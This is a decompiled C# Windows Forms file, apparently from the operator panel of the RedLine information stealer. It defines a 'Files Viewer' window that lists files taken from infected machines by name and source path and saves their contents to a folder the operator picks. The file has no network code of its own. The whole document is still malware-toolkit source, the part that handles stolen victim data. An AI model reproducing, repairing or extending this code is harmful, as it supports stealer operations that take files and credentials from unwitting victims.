using System;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Threading.Tasks;
using System.Windows.Forms;
using MetroSet_UI.Controls;
using MetroSet_UI.Design;
using RedLine.MainPanel.Data;
using RedLine.MainPanel.Data.Extensions;
using RedLine.SharedModels;

namespace RedLine.MainPanel.Views;

public class FilesViewer : Form
{
	[CompilerGenerated]
	private object object_0;

	private object object_1;

	private object topHeader;

	private object mainTitle;

	private object closeBtn;

	private object filesListView;

	private object fileNameDataGridViewTextBoxColumn;

	private object sourcePathDataGridViewTextBoxColumn;

	private object bodyDataGridViewImageColumn;

	private object object_2;

	private object m_a;

	private object m_b;

	private object c;

	private BindingList<RemoteFile> Files
	{
		[CompilerGenerated]
		get
		{
			return (BindingList<RemoteFile>)object_0;
		}
		[CompilerGenerated]
		set
		{
			object_0 = value;
		}
	}

	public FilesViewer(BindingList<RemoteFile> _pairs)
	{
		a();
		this.AllowDraggBy((Control)topHeader);
		this.ApplyShadows();
		Files = _pairs;
		((DataGridView)filesListView).DataSource = Files;
	}

	private void closeBtn_Click(object sender, object e)
	{
		Close();
	}

	private void topHeader_Paint(object sender, object e)
	{
		int num = ((Control)topHeader).Width - 1;
		int num2 = ((Control)topHeader).Height - 1;
		Pen pen = new Pen(Color.Red, 3f);
		((PaintEventArgs)e).Graphics.DrawRectangle(pen, 0, 0, num, num2);
	}

	private void FilesViewer_Paint(object sender, object e)
	{
		int num = base.Width - 1;
		int num2 = base.Height - 1;
		Pen pen = new Pen(Color.Red, 3f);
		((PaintEventArgs)e).Graphics.DrawRectangle(pen, 0, 0, num, num2);
	}

	private async void a_Click(object sender, object e)
	{
		await Task.Factory.StartNew(delegate
		{
			try
			{
				FolderSelectDialog folderSelectDialog = new FolderSelectDialog
				{
					InitialDirectory = Directory.GetCurrentDirectory(),
					Title = "Choose directory to save files"
				};
				if (folderSelectDialog.Show(base.Handle))
				{
					string fileName = folderSelectDialog.FileName;
					foreach (RemoteFile file in Files)
					{
						string text = Path.Combine(fileName, file.FileDirectory);
						if (!Directory.Exists(text))
						{
							Directory.CreateDirectory(text);
						}
						File.WriteAllBytes(Path.Combine(text, file.FileName), file.Body);
					}
					MessageBox.Show(this, "Done");
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(this, "Error: " + ex.ToString());
			}
		});
	}

	private void b_Opening(object sender, object e)
	{
		((CancelEventArgs)e).Cancel = ((DataGridView)filesListView).SelectedRows.Count == 0;
	}

	private async void c_Click(object sender, object e)
	{
		int selectedItem = ((DataGridView)filesListView).SelectedRows[0].Index;
		await Task.Factory.StartNew(delegate
		{
			try
			{
				FolderSelectDialog folderSelectDialog = new FolderSelectDialog
				{
					InitialDirectory = Directory.GetCurrentDirectory(),
					Title = "Choose directory to save file"
				};
				if (folderSelectDialog.Show(base.Handle))
				{
					RemoteFile remoteFile = Files[selectedItem];
					string text = Path.Combine(folderSelectDialog.FileName, remoteFile.FileDirectory);
					if (!Directory.Exists(text))
					{
						Directory.CreateDirectory(text);
					}
					File.WriteAllBytes(Path.Combine(text, remoteFile.FileName), remoteFile.Body);
					MessageBox.Show(this, "Done");
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(this, "Error: " + ex.ToString());
			}
		});
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && object_1 != null)
		{
			((IDisposable)object_1).Dispose();
		}
		base.Dispose(disposing);
	}

	private void a()
	{
		//IL_00b6: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c0: Expected O, but got Unknown
		object_1 = new Container();
		DataGridViewCellStyle dataGridViewCellStyle = new DataGridViewCellStyle();
		DataGridViewCellStyle dataGridViewCellStyle2 = new DataGridViewCellStyle();
		DataGridViewCellStyle dataGridViewCellStyle3 = new DataGridViewCellStyle();
		DataGridViewCellStyle dataGridViewCellStyle4 = new DataGridViewCellStyle();
		DataGridViewCellStyle dataGridViewCellStyle5 = new DataGridViewCellStyle();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(FilesViewer));
		topHeader = new Panel();
		mainTitle = new Label();
		closeBtn = new Label();
		filesListView = new DataGridView();
		fileNameDataGridViewTextBoxColumn = new DataGridViewTextBoxColumn();
		sourcePathDataGridViewTextBoxColumn = new DataGridViewTextBoxColumn();
		bodyDataGridViewImageColumn = new DataGridViewImageColumn();
		this.m_b = new ContextMenuStrip((IContainer)object_1);
		c = new ToolStripMenuItem();
		object_2 = new BindingSource((IContainer)object_1);
		this.m_a = (object)new MetroSetButton();
		((Control)topHeader).SuspendLayout();
		((ISupportInitialize)filesListView).BeginInit();
		((Control)this.m_b).SuspendLayout();
		((ISupportInitialize)object_2).BeginInit();
		SuspendLayout();
		((Control)topHeader).BackColor = Color.FromArgb(52, 56, 67);
		((Control)topHeader).Controls.Add((Control)mainTitle);
		((Control)topHeader).Controls.Add((Control)closeBtn);
		((Control)topHeader).Dock = DockStyle.Top;
		((Control)topHeader).ForeColor = Color.Silver;
		((Control)topHeader).Location = new Point(0, 0);
		((Control)topHeader).Name = "topHeader";
		((Control)topHeader).Size = new Size(762, 30);
		((Control)topHeader).TabIndex = 3;
		((Control)topHeader).Paint += topHeader_Paint;
		((Control)mainTitle).AutoSize = true;
		((Control)mainTitle).Font = new Font("Segoe UI", 11.25f, FontStyle.Regular, GraphicsUnit.Point, 204);
		((Control)mainTitle).ForeColor = Color.Red;
		((Control)mainTitle).Location = new Point(3, 4);
		((Control)mainTitle).Name = "mainTitle";
		((Control)mainTitle).Size = new Size(152, 20);
		((Control)mainTitle).TabIndex = 2;
		((Control)mainTitle).Text = "RedLine | Files Viewer";
		((Control)closeBtn).AutoSize = true;
		((Control)closeBtn).Font = new Font("Segoe UI Semibold", 12f, FontStyle.Bold, GraphicsUnit.Point, 204);
		((Control)closeBtn).ForeColor = Color.White;
		((Control)closeBtn).Location = new Point(729, 4);
		((Control)closeBtn).Name = "closeBtn";
		((Control)closeBtn).Size = new Size(20, 21);
		((Control)closeBtn).TabIndex = 1;
		((Control)closeBtn).Text = "X";
		((Control)closeBtn).Click += closeBtn_Click;
		((DataGridView)filesListView).AllowUserToAddRows = false;
		((DataGridView)filesListView).AllowUserToDeleteRows = false;
		((DataGridView)filesListView).AllowUserToResizeColumns = false;
		((DataGridView)filesListView).AllowUserToResizeRows = false;
		dataGridViewCellStyle.Alignment = DataGridViewContentAlignment.MiddleCenter;
		dataGridViewCellStyle.BackColor = Color.FromArgb(52, 60, 67);
		dataGridViewCellStyle.Font = new Font("Segoe UI", 9f);
		dataGridViewCellStyle.ForeColor = Color.Silver;
		dataGridViewCellStyle.WrapMode = DataGridViewTriState.False;
		((DataGridView)filesListView).AlternatingRowsDefaultCellStyle = dataGridViewCellStyle;
		((DataGridView)filesListView).AutoGenerateColumns = false;
		((DataGridView)filesListView).BackgroundColor = Color.FromArgb(52, 56, 67);
		((DataGridView)filesListView).BorderStyle = BorderStyle.None;
		((DataGridView)filesListView).CellBorderStyle = DataGridViewCellBorderStyle.RaisedVertical;
		((DataGridView)filesListView).ClipboardCopyMode = DataGridViewClipboardCopyMode.Disable;
		((DataGridView)filesListView).ColumnHeadersBorderStyle = DataGridViewHeaderBorderStyle.Single;
		dataGridViewCellStyle2.Alignment = DataGridViewContentAlignment.MiddleCenter;
		dataGridViewCellStyle2.BackColor = Color.FromArgb(58, 62, 73);
		dataGridViewCellStyle2.Font = new Font("Segoe UI", 9f);
		dataGridViewCellStyle2.ForeColor = Color.Silver;
		dataGridViewCellStyle2.SelectionBackColor = SystemColors.Highlight;
		dataGridViewCellStyle2.SelectionForeColor = SystemColors.HighlightText;
		dataGridViewCellStyle2.WrapMode = DataGridViewTriState.True;
		((DataGridView)filesListView).ColumnHeadersDefaultCellStyle = dataGridViewCellStyle2;
		((DataGridView)filesListView).ColumnHeadersHeightSizeMode = DataGridViewColumnHeadersHeightSizeMode.DisableResizing;
		((DataGridView)filesListView).Columns.AddRange((DataGridViewColumn)fileNameDataGridViewTextBoxColumn, (DataGridViewColumn)sourcePathDataGridViewTextBoxColumn, (DataGridViewColumn)bodyDataGridViewImageColumn);
		((Control)filesListView).ContextMenuStrip = (ContextMenuStrip)this.m_b;
		((DataGridView)filesListView).DataSource = object_2;
		dataGridViewCellStyle3.Alignment = DataGridViewContentAlignment.MiddleCenter;
		dataGridViewCellStyle3.BackColor = Color.FromArgb(58, 62, 73);
		dataGridViewCellStyle3.Font = new Font("Segoe UI", 9f);
		dataGridViewCellStyle3.ForeColor = Color.FromArgb(52, 56, 67);
		dataGridViewCellStyle3.SelectionBackColor = SystemColors.Highlight;
		dataGridViewCellStyle3.SelectionForeColor = SystemColors.HighlightText;
		dataGridViewCellStyle3.WrapMode = DataGridViewTriState.False;
		((DataGridView)filesListView).DefaultCellStyle = dataGridViewCellStyle3;
		((DataGridView)filesListView).EditMode = DataGridViewEditMode.EditOnEnter;
		((DataGridView)filesListView).EnableHeadersVisualStyles = false;
		((DataGridView)filesListView).GridColor = Color.FromArgb(52, 60, 67);
		((Control)filesListView).Location = new Point(7, 36);
		((DataGridView)filesListView).MultiSelect = false;
		((Control)filesListView).Name = "filesListView";
		((DataGridView)filesListView).ReadOnly = true;
		((DataGridView)filesListView).RowHeadersBorderStyle = DataGridViewHeaderBorderStyle.Single;
		dataGridViewCellStyle4.Alignment = DataGridViewContentAlignment.MiddleCenter;
		dataGridViewCellStyle4.BackColor = Color.FromArgb(52, 56, 67);
		dataGridViewCellStyle4.Font = new Font("Segoe UI", 9f);
		dataGridViewCellStyle4.ForeColor = Color.Silver;
		dataGridViewCellStyle4.SelectionBackColor = SystemColors.Highlight;
		dataGridViewCellStyle4.SelectionForeColor = SystemColors.HighlightText;
		dataGridViewCellStyle4.WrapMode = DataGridViewTriState.True;
		((DataGridView)filesListView).RowHeadersDefaultCellStyle = dataGridViewCellStyle4;
		((DataGridView)filesListView).RowHeadersWidthSizeMode = DataGridViewRowHeadersWidthSizeMode.DisableResizing;
		dataGridViewCellStyle5.Alignment = DataGridViewContentAlignment.MiddleCenter;
		dataGridViewCellStyle5.BackColor = Color.FromArgb(52, 60, 67);
		dataGridViewCellStyle5.ForeColor = Color.Silver;
		((DataGridView)filesListView).RowsDefaultCellStyle = dataGridViewCellStyle5;
		((DataGridView)filesListView).RowTemplate.DefaultCellStyle.Alignment = DataGridViewContentAlignment.MiddleCenter;
		((DataGridView)filesListView).RowTemplate.DefaultCellStyle.BackColor = Color.FromArgb(52, 56, 67);
		((DataGridView)filesListView).RowTemplate.DefaultCellStyle.ForeColor = Color.Silver;
		((DataGridView)filesListView).ScrollBars = ScrollBars.Vertical;
		((DataGridView)filesListView).SelectionMode = DataGridViewSelectionMode.FullRowSelect;
		((DataGridView)filesListView).ShowEditingIcon = false;
		((Control)filesListView).Size = new Size(746, 402);
		((Control)filesListView).TabIndex = 17;
		((DataGridViewColumn)fileNameDataGridViewTextBoxColumn).DataPropertyName = "FileName";
		((DataGridViewColumn)fileNameDataGridViewTextBoxColumn).HeaderText = "FileName";
		((DataGridViewColumn)fileNameDataGridViewTextBoxColumn).Name = "fileNameDataGridViewTextBoxColumn";
		((DataGridViewBand)fileNameDataGridViewTextBoxColumn).ReadOnly = true;
		((DataGridViewColumn)fileNameDataGridViewTextBoxColumn).Width = 200;
		((DataGridViewColumn)sourcePathDataGridViewTextBoxColumn).DataPropertyName = "SourcePath";
		((DataGridViewColumn)sourcePathDataGridViewTextBoxColumn).HeaderText = "SourcePath";
		((DataGridViewColumn)sourcePathDataGridViewTextBoxColumn).Name = "sourcePathDataGridViewTextBoxColumn";
		((DataGridViewBand)sourcePathDataGridViewTextBoxColumn).ReadOnly = true;
		((DataGridViewColumn)sourcePathDataGridViewTextBoxColumn).Width = 500;
		((DataGridViewColumn)bodyDataGridViewImageColumn).DataPropertyName = "Body";
		((DataGridViewColumn)bodyDataGridViewImageColumn).HeaderText = "Body";
		((DataGridViewColumn)bodyDataGridViewImageColumn).Name = "bodyDataGridViewImageColumn";
		((DataGridViewBand)bodyDataGridViewImageColumn).ReadOnly = true;
		((DataGridViewBand)bodyDataGridViewImageColumn).Visible = false;
		((ToolStrip)this.m_b).Items.AddRange(new ToolStripItem[1] { (ToolStripItem)c });
		((Control)this.m_b).Name = "logContextMenu";
		((Control)this.m_b).Size = new Size(99, 26);
		((ToolStripDropDown)this.m_b).Opening += b_Opening;
		((ToolStripItem)c).Name = "copyToolStripMenuItem";
		((ToolStripItem)c).Size = new Size(98, 22);
		((ToolStripItem)c).Text = "Save";
		((ToolStripItem)c).Click += c_Click;
		((BindingSource)object_2).DataSource = typeof(RemoteFile);
		((MetroSetButton)this.m_a).DisabledBackColor = Color.FromArgb(120, 65, 177, 225);
		((MetroSetButton)this.m_a).DisabledBorderColor = Color.FromArgb(120, 65, 177, 225);
		((MetroSetButton)this.m_a).DisabledForeColor = Color.Gray;
		((Control)this.m_a).Font = new Font("Microsoft Sans Serif", 10f);
		((MetroSetButton)this.m_a).HoverBorderColor = Color.FromArgb(95, 207, 255);
		((MetroSetButton)this.m_a).HoverColor = Color.FromArgb(95, 207, 255);
		((MetroSetButton)this.m_a).HoverTextColor = Color.White;
		((Control)this.m_a).Location = new Point(647, 444);
		((Control)this.m_a).Name = "saveBtn";
		((MetroSetButton)this.m_a).NormalBorderColor = Color.FromArgb(65, 177, 225);
		((MetroSetButton)this.m_a).NormalColor = Color.FromArgb(65, 177, 225);
		((MetroSetButton)this.m_a).NormalTextColor = Color.White;
		((MetroSetButton)this.m_a).PressBorderColor = Color.FromArgb(35, 147, 195);
		((MetroSetButton)this.m_a).PressColor = Color.FromArgb(35, 147, 195);
		((MetroSetButton)this.m_a).PressTextColor = Color.White;
		((Control)this.m_a).Size = new Size(102, 20);
		((MetroSetButton)this.m_a).Style = (Style)0;
		((MetroSetButton)this.m_a).StyleManager = null;
		((Control)this.m_a).TabIndex = 23;
		((Control)this.m_a).Text = "Save list";
		((MetroSetButton)this.m_a).ThemeAuthor = "Narwin";
		((MetroSetButton)this.m_a).ThemeName = "MetroLite";
		((Control)this.m_a).Click += a_Click;
		base.AutoScaleDimensions = new SizeF(6f, 13f);
		base.AutoScaleMode = AutoScaleMode.Font;
		BackColor = Color.FromArgb(52, 56, 67);
		base.ClientSize = new Size(762, 475);
		base.Controls.Add((Control)this.m_a);
		base.Controls.Add((Control)filesListView);
		base.Controls.Add((Control)topHeader);
		base.FormBorderStyle = FormBorderStyle.None;
		base.Icon = (Icon)componentResourceManager.GetObject("$this.Icon");
		base.Name = "FilesViewer";
		base.StartPosition = FormStartPosition.CenterScreen;
		Text = "RedLine | Files Viewer";
		base.Paint += FilesViewer_Paint;
		((Control)topHeader).ResumeLayout(performLayout: false);
		((Control)topHeader).PerformLayout();
		((ISupportInitialize)filesListView).EndInit();
		((Control)this.m_b).ResumeLayout(performLayout: false);
		((ISupportInitialize)object_2).EndInit();
		ResumeLayout(performLayout: false);
	}

	[CompilerGenerated]
	private void b()
	{
		try
		{
			FolderSelectDialog folderSelectDialog = new FolderSelectDialog
			{
				InitialDirectory = Directory.GetCurrentDirectory(),
				Title = "Choose directory to save files"
			};
			if (!folderSelectDialog.Show(base.Handle))
			{
				return;
			}
			string fileName = folderSelectDialog.FileName;
			foreach (RemoteFile file in Files)
			{
				string text = Path.Combine(fileName, file.FileDirectory);
				if (!Directory.Exists(text))
				{
					Directory.CreateDirectory(text);
				}
				File.WriteAllBytes(Path.Combine(text, file.FileName), file.Body);
			}
			MessageBox.Show(this, "Done");
		}
		catch (Exception ex)
		{
			MessageBox.Show(this, "Error: " + ex.ToString());
		}
	}
}
